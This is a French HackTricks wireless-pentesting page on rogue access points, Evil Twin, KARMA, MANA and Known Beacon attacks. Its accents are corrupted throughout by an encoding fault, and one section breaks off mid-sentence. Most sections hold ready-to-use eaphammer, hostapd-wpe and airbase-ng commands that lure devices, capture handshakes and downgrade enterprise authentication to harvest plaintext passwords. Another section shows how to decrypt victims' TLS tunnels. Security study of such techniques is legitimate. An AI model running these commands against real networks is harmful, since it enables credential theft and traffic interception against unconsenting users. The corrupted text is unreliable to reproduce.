### Listes de r√©seaux pr√©f√©r√©s (PNL)

* Les stations stockent l'ESSID de chaque r√©seau sans fil auquel elles se connectent dans leur Liste de R√©seaux Pr√©f√©r√©s (PNL), ainsi que des d√©tails de configuration sp√©cifiques au r√©seau.
* La PNL est utilis√©e pour se connecter automatiquement √† des r√©seaux connus, am√©liorant l'exp√©rience utilisateur en rationalisant le processus de connexion.

### Analyse passive

* Les AP diffusent p√©riodiquement des trames de balise, annon√ßant leur pr√©sence et leurs caract√©ristiques, y compris l'ESSID de l'AP, √† moins que la diffusion ne soit d√©sactiv√©e.
* Lors de l'analyse passive, les stations √©coutent les trames de balise. Si l'ESSID d'une balise correspond √† une entr√©e dans la PNL de la station, la station peut se connecter automatiquement √† cet AP.
* La connaissance de la PNL d'un appareil permet une exploitation potentielle en imitant l'ESSID d'un r√©seau connu, trompant l'appareil pour qu'il se connecte √† un AP malveillant.

### Analyse active

* L'analyse active implique que les stations envoient des requ√™tes de sonde pour d√©couvrir les AP √† proximit√© et leurs caract√©ristiques.
* Les requ√™tes de sonde dirig√©es ciblent un ESSID sp√©cifique, aidant √† d√©tecter si un r√©seau particulier est √† port√©e, m√™me s'il s'agit d'un r√©seau cach√©.
* Les requ√™tes de sonde diffus√©es ont un champ SSID nul et sont envoy√©es √† tous les AP √† proximit√©, permettant √† la station de v√©rifier tout r√©seau pr√©f√©r√© sans divulguer le contenu de sa PNL.

## AP simple avec redirection vers Internet

Avant d'expliquer comment effectuer des attaques plus complexes, il va √™tre expliqu√© **comment** simplement **cr√©er** un **AP** et **rediriger** son **trafic** vers une interface connect√©e **√†** l'**Internet**.

En utilisant `ifconfig -a`, v√©rifiez que l'interface wlan pour cr√©er l'AP et l'interface connect√©e √† Internet sont pr√©sentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Cr√©er le fichier de configuration `/etc/dnsmasq.conf` :
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Puis **d√©finissez les IP** et **les routes** :
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Et ensuite **d√©marrer** dnsmasq :
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Cr√©er un fichier de configuration `hostapd.conf` :
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Arr√™tez les processus ennuyeux**, d√©finissez **le mode moniteur** et **d√©marrez hostapd** :
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Transfert et Redirection
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Une attaque de jumeau malveillant exploite la fa√ßon dont les clients WiFi reconnaissent les r√©seaux, s'appuyant principalement sur le nom du r√©seau (ESSID) sans n√©cessiter que la station de base (point d'acc√®s) s'authentifie aupr√®s du client. Les points cl√©s incluent :

* **Difficult√© de Diff√©renciation** : Les appareils ont du mal √† distinguer entre les points d'acc√®s l√©gitimes et malveillants lorsqu'ils partagent le m√™me ESSID et type de cryptage. Les r√©seaux du monde r√©el utilisent souvent plusieurs points d'acc√®s avec le m√™me ESSID pour √©tendre la couverture de mani√®re transparente.
* **Roaming des Clients et Manipulation de Connexion** : Le protocole 802.11 permet aux appareils de se d√©placer entre les points d'acc√®s au sein du m√™me ESS. Les attaquants peuvent exploiter cela en incitant un appareil √† se d√©connecter de sa station de base actuelle et √† se connecter √† une station malveillante. Cela peut √™tre r√©alis√© en offrant un signal plus fort ou en perturbant la connexion au point d'acc√®s l√©gitime par des m√©thodes telles que des paquets de d√©sauthentification ou le brouillage.
* **D√©fis d'Ex√©cution** : Ex√©cuter avec succ√®s une attaque de jumeau malveillant dans des environnements avec plusieurs points d'acc√®s bien plac√©s peut √™tre difficile. D√©sauthentifier un seul point d'acc√®s l√©gitime entra√Æne souvent la connexion de l'appareil √† un autre point d'acc√®s l√©gitime, √† moins que l'attaquant ne puisse d√©sauthentifier tous les points d'acc√®s √† proximit√© ou placer strat√©giquement le point d'acc√®s malveillant.

Vous pouvez cr√©er un Open Evil Twin tr√®s basique (sans capacit√©s de routage du trafic vers Internet) en :
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Vous pouvez √©galement cr√©er un Evil Twin en utilisant **eaphammer** (notez que pour cr√©er des evil twins avec eaphammer, l'interface **ne doit PAS √™tre** en mode **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou en utilisant Airgeddon : `Options : 5,6,7,8,9 (dans le menu d'attaque Evil Twin).`

![](<../../.gitbook/assets/image (1088).png>)

Veuillez noter qu'en r√®gle g√©n√©rale, si un ESSID dans le PNL est enregistr√© comme prot√©g√© par WPA, l'appareil ne se connectera pas automatiquement √† un Evil Twin ouvert. Vous pouvez essayer de DoS le vrai AP et esp√©rer que l'utilisateur se connecte manuellement √† votre Evil Twin ouvert, ou vous pourriez DoS le vrai AP et utiliser un WPA Evil Twin pour capturer le handshake (en utilisant cette m√©thode, vous ne pourrez pas laisser la victime se connecter √† vous car vous ne connaissez pas le PSK, mais vous pouvez capturer le handshake et essayer de le cracker).

_Certains syst√®mes d'exploitation et antivirus avertiront l'utilisateur que se connecter √† un r√©seau ouvert est dangereux..._

### WPA/WPA2 Evil Twin

Vous pouvez cr√©er un **Evil Twin utilisant WPA/2** et si les appareils sont configur√©s pour se connecter √† ce SSID avec WPA/2, ils vont essayer de se connecter. Quoi qu'il en soit, **pour compl√©ter le 4-way-handshake**, vous devez √©galement **conna√Ætre** le **mot de passe** que le client va utiliser. Si vous **ne le connaissez pas**, la **connexion ne sera pas compl√©t√©e**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Pour comprendre ces attaques, je recommande de lire d'abord le bref [WPA Enterprise explanation](./#wpa-enterprise-mgt).

**Utilisation de hostapd-wpe**

`hostapd-wpe` n√©cessite un **fichier de configuration** pour fonctionner. Pour **automatiser** la g√©n√©ration de ces configurations, vous pouvez utiliser [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (t√©l√©chargez le fichier python √† l'int√©rieur de _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Dans le fichier de configuration, vous pouvez s√©lectionner de nombreuses choses diff√©rentes comme ssid, canal, fichiers utilisateur, cret/key, param√®tres dh, version wpa et auth...

[**Utilisation de hostapd-wpe avec EAP-TLS pour permettre √† n'importe quel certificat de se connecter.**](evil-twin-eap-tls.md)

**Utilisation de EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Par d√©faut, EAPHammer propose ces m√©thodes d'authentification (remarquez GTC comme la premi√®re √† essayer d'obtenir des mots de passe en clair, puis l'utilisation de m√©thodes d'authentification plus robustes) :
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
C'est la m√©thodologie par d√©faut pour √©viter de longs temps de connexion. Cependant, vous pouvez √©galement sp√©cifier au serveur les m√©thodes d'authentification du plus faible au plus fort :
```
--negotiate weakest
```
Ou vous pourriez √©galement utiliser :

* `--negotiate gtc-downgrade` pour utiliser une impl√©mentation de downgrade GTC tr√®s efficace (mots de passe en clair)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` pour sp√©cifier manuellement les m√©thodes propos√©es (offrir les m√™mes m√©thodes d'authentification dans le m√™me ordre que l'organisation rendra l'attaque beaucoup plus difficile √† d√©tecter).
* [Trouvez plus d'infos dans le wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Utilisation d'Airgeddon**

`Airgeddon` peut utiliser des certificats pr√©c√©demment g√©n√©r√©s pour offrir une authentification EAP aux r√©seaux WPA/WPA2-Enterprise. Le r√©seau factice fera r√©trograder le protocole de connexion √† EAP-MD5 afin de pouvoir **capturer l'utilisateur et le MD5 du mot de passe**. Plus tard, l'attaquant peut essayer de cracker le mot de passe.\
`Airgeddon` vous offre la possibilit√© d'une **attaque Evil Twin continue (bruyante)** ou **de cr√©er uniquement l'attaque Evil jusqu'√† ce que quelqu'un se connecte (douce).**

![](<../../.gitbook/assets/image (936).png>)

### D√©bogage des tunnels TLS PEAP et EAP-TTLS dans les attaques Evil Twins

_Cette m√©thode a √©t√© test√©e dans une connexion PEAP mais comme je d√©chiffre un tunnel TLS arbitraire, cela devrait √©galement fonctionner avec EAP-TTLS_

Dans la **configuration** de _hostapd-wpe_, **commentez** la ligne contenant _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` √† `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Cela fera que `hostapd-wpe` **√©change des cl√©s en utilisant RSA** au lieu de DH, vous permettant ainsi de **d√©crypter** le trafic plus tard **en connaissant la cl√© priv√©e du serveur**.

Maintenant, d√©marrez le **Evil Twin** en utilisant **`hostapd-wpe`** avec cette configuration modifi√©e comme d'habitude. D√©marrez √©galement **`wireshark`** dans l'**interface** qui effectue l'attaque Evil Twin.

Maintenant ou plus tard (lorsque vous avez d√©j√† captur√© quelques tentatives d'authentification), vous pouvez ajouter la cl√© RSA priv√©e √† wireshark dans : `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ajoutez une nouvelle entr√©e et remplissez le formulaire avec ces valeurs : **Adresse IP = any** -- **Port = 0** -- **Protocole = data** -- **Fichier cl√©** (**s√©lectionnez votre fichier cl√©**, pour √©viter les probl√®mes, s√©lectionnez un fichier cl√© **sans protection par mot de passe**).

![](<../../.gitbook/assets/image (687).png>)

Et regardez le nouvel **onglet "TLS d√©chiffr√©"** :

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, Loud MANA et attaque de balises connues

### ESSID et listes noires/blanches MAC

Diff√©rents types de listes de filtres d'acc√®s aux m√©dias (MFACLs) et leurs modes et effets correspondants sur le comportement d'un point d'acc√®s (AP) malveillant :

1. **Liste blanche bas√©e sur MAC** :
* Le point d'acc√®s malveillant ne r√©pondra qu'aux requ√™tes de sonde des appareils sp√©cifi√©s dans la liste blanche, restant invisible √† tous les autres non list√©s.
2. **Liste noire bas√©e sur MAC** :
* Le point d'acc√®s malveillant ignorera les requ√™tes de sonde des appareils sur la liste noire, rendant effectivement le point d'acc√®s malveillant invisible √† ces appareils sp√©cifiques.
3. **Liste blanche bas√©e sur SSID** :
* Le point d'acc√®s malveillant r√©pondra aux requ√™tes de sonde uniquement pour des ESSIDs sp√©cifiques list√©s, le rendant invisible aux appareils dont les listes de r√©seaux pr√©f√©r√©s (PNLs) ne contiennent pas ces ESSIDs.
4. **Liste noire bas√©e sur SSID** :
* Le point d'acc√®s malveillant ne r√©pondra pas aux requ√™tes de sonde pour les ESSIDs sp√©cifiques sur la liste noire, le rendant invisible aux appareils recherchant ces r√©seaux particuliers.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Cette m√©thode permet √† un **attaquant de cr√©er un point d'acc√®s malveillant (AP) qui r√©pond √† toutes les requ√™tes de sonde** des appareils cherchant √† se connecter √† des r√©seaux. Cette technique **trompe les appareils en les faisant se connecter √† l'AP de l'attaquant** en imitant les r√©seaux que les appareils recherchent. Une fois qu'un appareil envoie une demande de connexion √† cet AP malveillant, il compl√®te la connexion, conduisant l'appareil √† se connecter par erreur au r√©seau de l'attaquant.

### MANA

Ensuite, **les appareils ont commenc√© √† ignorer les r√©ponses r√©seau non sollicit√©es**, r√©duisant l'efficacit√© de l'attaque karma originale. Cependant, une nouvelle m√©thode, connue sous le nom d'**attaque MANA**, a √©t√© introduite par Ian de Villiers et Dominic White. Cette m√©thode implique que l'AP malveillant **capture les listes de r√©seaux pr√©f√©r√©s (PNL) des appareils en r√©pondant √† leurs requ√™tes de sonde diffus√©es** avec des noms de r√©seaux (SSID) pr√©c√©demment sollicit√©s par les appareils. Cette attaque sophistiqu√©e contourne les protections contre l'attaque karma originale en exploitant la fa√ßon dont les appareils se souviennent et priorisent les r√©seaux connus.

L'attaque MANA fonctionne en surveillant √† la fois les requ√™tes de sonde dirig√©es et diffus√©es des appareils. Pour les requ√™tes dirig√©es, elle enregistre l'adresse MAC de l'appareil et le nom du r√©seau demand√©, ajoutant ces informations √† une liste. Lorsqu'une requ√™te diffus√©e est re√ßue, l'AP r√©pond avec des informations correspondant √† l'un des r√©seaux sur la liste de l'appareil, incitant l'appareil √† se connecter √† l'AP malveillant.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Une **attaque Loud MANA** est une strat√©gie avanc√©e pour les cas o√π les appareils n'utilisent pas de sondage dirig√© ou lorsque leurs listes de r√©seaux pr√©f√©r√©s (PNL) sont inconnues de l'attaquant. Elle fonctionne sur le principe que **les appareils dans la m√™me zone sont susceptibles de partager certains noms de r√©seau dans leurs PNL**. Au lieu de r√©pondre de mani√®re s√©lective, cette attaque diffuse des r√©ponses de sondage pour chaque nom de r√©seau (ESSID) trouv√© dans les PNL combin√©es de tous les appareils observ√©s. Cette approche large augmente la chance qu'un appareil reconnaisse un r√©seau familier et tente de se connecter au point d'acc√®s (AP) malveillant.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Lorsque l'**attaque Loud MANA** peut ne pas suffire, l'**attaque Known Beacon** pr√©sente une autre approche. Cette m√©thode **force le processus de connexion en simulant un AP qui r√©pond √† n'importe quel nom de r√©seau, en parcourant une liste de ESSIDs potentiels** d√©riv√©s d'une liste de mots. Cela simule la pr√©sence de nombreux r√©seaux, esp√©rant faire correspondre un ESSID dans la PNL de la victime, incitant √† une tentative de connexion √† l'AP fabriqu√©. L'attaque peut √™tre amplifi√©e en la combinant avec l'option `--loud` pour une tentative plus agressive d'attraper des appareils.

Eaphammer a impl√©ment√© cette attaque comme une attaque MANA o√π tous les ESSIDs d'une liste sont charg√©s (vous pouvez √©galement combiner cela avec `--loud` pour cr√©er une attaque Loud MANA + Known beacons) :
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Attaque de Beacon Burst connue**

L'**attaque de Beacon Burst connue** implique **la diffusion rapide de trames de beacon pour chaque ESSID r√©pertori√© dans un fichier**. Cela cr√©e un environnement dense de r√©seaux fictifs, augmentant consid√©rablement la probabilit√© que les appareils se connectent au point d'acc√®s malveillant, surtout lorsqu'elle est combin√©e avec une attaque MANA. Cette technique exploite la vitesse et le volume pour submerger les m√©canismes de s√©lection de r√©seau des appareils.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** est un protocole permettant aux appareils de se connecter directement entre eux via Wi-Fi sans avoir besoin d'un point d'acc√®s sans fil traditionnel. Cette capacit√© est int√©gr√©e dans divers appareils de l'Internet des objets (IoT), tels que les imprimantes et les t√©l√©viseurs, facilitant la communication directe entre appareils. Une caract√©ristique notable de Wi-Fi Direct est qu'un appareil assume le r√¥le d'un point d'acc√®s, connu sous le nom de propri√©taire de groupe, pour g√©rer la connexion.

La s√©curit√© des connexions Wi-Fi Direct est √©tablie par **Wi-Fi Protected Setup (WPS)**, qui prend en charge plusieurs m√©thodes de couplage s√©curis√©, y compris :

* **Push-Button Configuration (PBC)**
* **Saisie de PIN**
* **Near-Field Communication (NFC)**

Ces m√©thodes, en particulier la saisie de PIN, sont susceptibles des m√™mes vuln√©rabilit√©s que le WPS dans les r√©seaux Wi-Fi traditionnels, les rendant cibles de vecteurs d'attaque similaires.

### EvilDirect Hijacking

**EvilDirect Hijacking** est une attaque sp√©cifique √† Wi-Fi Direct. Elle refl√®te le concept d'une attaque Evil Twin mais cible les connexions Wi-Fi Direct. Dans ce sc√©nario, un attaquant se fait passer pour un propri√©taire de groupe l√©gitime dans le but de tromper les appareils pour qu'ils se connectent √† une entit√© malveillante. Cette m√©thode peut √™tre ex√©cut√©e √† l'aide d'outils comme `airbase-ng` en sp√©cifiant le canal, l'ESSID et l'adresse MAC de l'appareil usurp√© :

## References

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Jetez un ≈ìil √† [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (connexion avec Facebook et imitation de WPA dans des portails captifs)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Hacking Insights**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Real-Time Hack News**\
Restez √† jour avec le monde du hacking en rapide √©volution gr√¢ce √† des nouvelles et des informations en temps r√©el

**Latest Announcements**\
Restez inform√© des nouvelles primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
